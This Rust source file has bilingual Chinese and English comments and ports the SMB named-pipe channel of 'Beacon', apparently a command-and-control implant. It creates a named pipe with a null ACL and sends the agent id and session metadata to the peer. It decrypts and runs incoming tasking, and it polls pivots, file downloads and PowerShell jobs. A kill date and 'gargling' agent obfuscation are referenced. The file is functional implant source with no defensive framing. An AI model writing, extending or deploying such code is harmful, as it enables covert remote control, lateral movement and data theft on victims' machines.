//! client.cpp 的移植版 —— 管理 Beacon 的 SMB 数据通道。
//! Port of client.cpp — Manage the SMB data channel for Beacon.
//!
//! 入口点：
//! 1. `command_link_wait` —— 用户请求 SMB 数据通道
//! 2. `smb_init` —— 创建带 null ACL 的命名管道
//! 3. `smb_wait` —— 等待连接……连接到来时发送 agent id
//! 4. `client_process` —— 处理服务器数据……做正常的 beacon 事务。
//! Entry point:
//! 1. `command_link_wait` — user requested SMB data channel
//! 2. `smb_init` — create our named pipe with a null ACL
//! 3. `smb_wait` — wait for a connection... send agent id when it comes
//! 4. `client_process` — process server data please... do normal beacon stuff.
//!
//! 该模块用读/写缓冲区包装 `LChannel`，并对对端使用客户端帧协议
//! `[len:4 (网络字节序)][data]`。
//! This module wraps an `LChannel` with read/write buffers and speaks the
//! client frame protocol `[len:4 (network order)][data]` to the peer.

use crate::callback::command_shell_callback;
use crate::commands::{check_kill_date, command_die, MAX_PACKET};
use crate::link::{link_poll, LChannel};
use crate::proto::process_payload;
use crate::security::security_decrypt;
use crate::state;
use parking_lot::Mutex;

/// 客户端帧的最大尺寸（clientint.h 的 `MAX_GET`）。
/// Maximum size of a client frame (clientint.h `MAX_GET`).
pub const MAX_GET: usize = 1024 * 1024;

/// 我们已连接的服务器通道（client.cpp 的 `static LCHANNEL server`）。
/// Our connected server channel (client.cpp `static LCHANNEL server`).
static SERVER: Mutex<Option<LChannel>> = Mutex::new(None);

/// 通道的缓冲写入（client.cpp 的 `client_write_buffer`）。
/// Buffered writes for the channel (client.cpp `client_write_buffer`).
static CLIENT_WRITE_BUFFER: Mutex<Option<Vec<u8>>> = Mutex::new(None);

/// 当前在 `CLIENT_WRITE_BUFFER` 中排队的字节数（client.cpp 的 `client_write_len`）。
/// Bytes currently queued in `CLIENT_WRITE_BUFFER` (client.cpp `client_write_len`).
static CLIENT_WRITE_LEN: Mutex<usize> = Mutex::new(0);

/// 用于从服务器返回帧的读缓冲区（client.cpp 的 `client_read_buffer`）。
/// Read buffer for frames coming back from the server (client.cpp `client_read_buffer`).
static CLIENT_READ_BUFFER: Mutex<Option<Vec<u8>>> = Mutex::new(None);

// ---------------------------------------------------------------------------
// LCHANNEL 宏的等价实现。C++ 宏把 `&channel`（指向 LCHANNEL 结构本身的指针）
// 作为 `thisp` 参数传入；我们也这样做。
// LCHANNEL macro equivalents. The C++ macros pass `&channel` (a pointer to
// the LCHANNEL struct itself) as the `thisp` argument; we do the same.
// ---------------------------------------------------------------------------

/// LCHANNEL_WRITE_FRAME —— 成功返回 TRUE (1)，失败返回 FALSE (0)。
/// LCHANNEL_WRITE_FRAME — returns TRUE (1) on success, FALSE (0) on failure.
fn lchannel_write(server: &mut LChannel, buffer: *const u8, length: usize) -> i32 {
    match server.write {
        Some(f) => unsafe {
            f(
                server as *mut LChannel as *mut core::ffi::c_void,
                buffer,
                length,
            )
        },
        None => 0,
    }
}

/// LCHANNEL_READ_FRAME —— >0 表示读到了字节，0 表示没有数据，<0 表示连接失败。
/// LCHANNEL_READ_FRAME — >0 bytes read, 0 no data, <0 connection failed.
fn lchannel_read(server: &mut LChannel, buffer: *mut u8, max: usize) -> i32 {
    match server.read {
        Some(f) => unsafe {
            f(
                server as *mut LChannel as *mut core::ffi::c_void,
                buffer,
                max,
            )
        },
        None => -1,
    }
}

/// LCHANNEL_CLOSE（关闭通道）。
/// LCHANNEL_CLOSE.
fn lchannel_close(server: &mut LChannel) {
    if let Some(f) = server.close {
        unsafe { f(server as *mut LChannel as *mut core::ffi::c_void) };
    }
}

/// LCHANNEL_FLUSH（刷新通道）。
/// LCHANNEL_FLUSH.
fn lchannel_flush(server: &mut LChannel) {
    if let Some(f) = server.flush {
        unsafe { f(server as *mut LChannel as *mut core::ffi::c_void) };
    }
}

/// LCHANNEL_WAIT —— 阻塞直到通道准备好读取。
/// LCHANNEL_WAIT — block until the channel is ready to read.
fn lchannel_wait(server: &mut LChannel) {
    if let Some(f) = server.wait {
        unsafe { f(server as *mut LChannel as *mut core::ffi::c_void) };
    }
}

/// 惰性分配客户端读缓冲区（client.cpp 在 `client_process` 中分配它）。
/// Lazily allocate the client read buffer (client.cpp allocates it in
/// `client_process`).
fn ensure_read_buffer() {
    let mut rb = CLIENT_READ_BUFFER.lock();
    if rb.is_none() {
        *rb = Some(vec![0u8; MAX_GET]);
    }
}

/*
 *  假设我们有一个已连接的客户端，请把所有东西设置好！
 *  assume we have a connected client, set everything up, please!
 */
pub fn client_init(channel: LChannel) {
    /* 分配我们的数据 / alloc our data */
    *CLIENT_WRITE_BUFFER.lock() = Some(vec![0u8; MAX_GET]);
    *CLIENT_WRITE_LEN.lock() = 0;

    /* 现在我们可以分配句柄 / now we can assign the handle */
    *SERVER.lock() = Some(channel);

    /* 复制元数据：agent id（本机字节序，在 C++ 中 memcpy） / copy metadata: agent id (native byte order, memcpy'd in the C++) */
    let mut out = Vec::with_capacity(4 + state::BIGSESSION.lock().length);
    out.extend_from_slice(&state::agentid().to_ne_bytes());

    /* 复制元数据：base64 编码的会话元数据 / copy metadata: base64 encoded session metadata */
    {
        let bs = state::BIGSESSION.lock();
        out.extend_from_slice(&bs.data[..bs.length]);
    }

    /* 写出我们的 agent id 和元数据 / write out our agent id and metadata */
    let mut guard = SERVER.lock();
    if let Some(server) = guard.as_mut() {
        lchannel_write(server, out.as_ptr(), out.len());
        lchannel_flush(server);
    }
}

/*
 *  清理我们的客户端，谢谢！
 *  clean up our client, thanks!
 */
pub fn client_stop() {
    /* 释放我们的一些数据 / free up some of our data */
    *CLIENT_WRITE_LEN.lock() = 0;

    *CLIENT_WRITE_BUFFER.lock() = None;
    *CLIENT_READ_BUFFER.lock() = None;
}

/*
 * 向我们的命名管道写入数据
 * write data to our named pipe
 */
pub fn client_write(buffer: &[u8], len: usize) {
    /* 切片就是数据；`len` 表示要发送多少（与 C++ 一致） / the slice is the data; `len` says how much of it to send (as in C++) */
    let len = len.min(buffer.len());

    /* 健全性检查，确保我们没有发送过大得离谱的文件 / sanity check to make sure we're not sending an obscenely sized file */
    if (len + std::mem::size_of::<u32>()) > MAX_GET {
        /* 这个消息太大了，绝对不行！ / this message is too big, no way in hell! */
        return;
    }

    let mut mustread = 0;

    /* 如果我们太大，现在就发布。大小检查和追加在同一个锁下进行，
     * 这样两个并发写入者永远不会溢出共享缓冲区（C++ 没有这种保护）。
     * if we're be too big, go ahead and make a post now. The size check and
     * the append happen under the same lock so two concurrent writers can
     * never overflow the shared buffer (the C++ has no such protection). */
    let flen = (len as u32).to_be_bytes(); // htonl(len)
    loop {
        let mut wb = CLIENT_WRITE_BUFFER.lock();
        let wbuf = wb.get_or_insert_with(|| vec![0u8; MAX_GET]);
        let mut wl = CLIENT_WRITE_LEN.lock();
        if (*wl + len + std::mem::size_of::<u32>()) > MAX_GET {
            /* 我们太大了……所以……刷新吧 / we're too big... sooo.... let's flush */
            let _ = wl;
            drop(wb);
            client_flush();
            /* 我们搞砸了读/写循环，所以标记一下我们需要做一次读取 / we f'd up read/write loop, so let's flag that we need to do a read */
            mustread = 1;
            continue;
        }

        /* 如果我们不太大，就追加长度和数据 / if we're not too big, let's append our length and data */
        wbuf[*wl..*wl + 4].copy_from_slice(&flen);
        *wl += 4;

        /* 现在，让我们追加要发布的数据 / now, let's append our data to post */
        wbuf[*wl..*wl + len].copy_from_slice(&buffer[..len]);
        *wl += len;
        break;
    }

    /* SMB 循环假定 READ、WRITE、READ 等顺序——我们在这里做一次读取让循环回到正轨
     * SMB loop assumes READ, WRITE, READ, etc. - we do a read here to put loop back on track */
    if mustread == 1 {
        let mut payload = None;
        {
            let mut guard = SERVER.lock();
            if let Some(server) = guard.as_mut() {
                /* 等待数据可用（如果启用了 gargling，同时混淆我们的 agent）
                 * wait for data to be available (and obfuscate our agent if gargling is enabled) */
                lchannel_wait(server);

                /* 从连接中读取 / read from the connection */
                let mut rb = CLIENT_READ_BUFFER.lock();
                let rbuf = rb.get_or_insert_with(|| vec![0u8; MAX_GET]);
                let length = lchannel_read(server, rbuf.as_mut_ptr(), MAX_GET);
                if length > 0 {
                    let length = security_decrypt(rbuf.as_mut_slice(), length as usize);
                    if length > 0 {
                        payload = Some(rbuf[..length as usize].to_vec());
                    }
                }
            }
        }
        if let Some(mut p) = payload {
            let plen = p.len();
            process_payload(&mut p, plen);
        }
    }
}

/*
 * 这对 TCP Beacon 最有益，但嘿……
 * this benefits the TCP Beacon more than anything, but hey...
 */
pub fn client_close() {
    let mut guard = SERVER.lock();
    if let Some(server) = guard.as_mut() {
        lchannel_flush(server);
        lchannel_close(server);
    }
}

/*
 * 把我们的数据发回去
 * post our data back
 */
pub fn client_flush() {
    /* 锁顺序始终是 WRITE_BUFFER -> WRITE_LEN -> SERVER（client_write
     * 锁定 WRITE_BUFFER -> WRITE_LEN），因此并发写入者永远不会死锁
     * lock order is always WRITE_BUFFER -> WRITE_LEN -> SERVER (client_write
     * locks WRITE_BUFFER -> WRITE_LEN) so concurrent writers never deadlock */
    let wbuf = CLIENT_WRITE_BUFFER.lock();
    let mut wl = CLIENT_WRITE_LEN.lock();
    let write_len = *wl;

    let mut guard = SERVER.lock();
    if let Some(server) = guard.as_mut() {
        if write_len > 0 {
            if let Some(buf) = wbuf.as_ref() {
                lchannel_write(server, buf.as_ptr(), write_len);
            }
        } else {
            lchannel_write(server, core::ptr::null(), 0);
        }
        lchannel_flush(server);
    }
    drop(wbuf);
    drop(guard);

    *wl = 0;
}

pub fn client_process() {
    /* 如果我们还没有读缓冲区，就分配一个 / allocate our read buffer if we don't have one yet */
    ensure_read_buffer();

    loop {
        /* 等待数据可用（如果启用了 gargling，同时混淆我们的 agent）
         * wait for data to be available (and obfuscate our agent if gargling is enabled) */
        let mut payload = None;
        {
            let mut guard = SERVER.lock();
            let server = match guard.as_mut() {
                Some(s) => s,
                None => return,
            };

            lchannel_wait(server);

            /* 从连接中读取 / read from the connection */
            let mut rb = CLIENT_READ_BUFFER.lock();
            let rbuf = rb.get_or_insert_with(|| vec![0u8; MAX_GET]);
            let length = lchannel_read(server, rbuf.as_mut_ptr(), MAX_GET);
            if length < 0 {
                return;
            }

            if length > 0 {
                let length = security_decrypt(rbuf.as_mut_slice(), length as usize);
                if length > 0 {
                    payload = Some(rbuf[..length as usize].to_vec());
                }
            }
        }

        if let Some(mut p) = payload {
            let plen = p.len();
            process_payload(&mut p, plen);
        }

        crate::pivot::pivot_poll(command_shell_callback);
        crate::files::download_poll(command_shell_callback, MAX_PACKET / 2);
        link_poll(command_shell_callback);
        crate::jobs::psh_poll(command_shell_callback, MAX_PACKET);

        /* 检查终止日期 / check the kill date */
        if check_kill_date() {
            command_die(command_shell_callback);
        }

        client_flush();

        if state::sleep_time() == 0 {
            return;
        }
    }
}
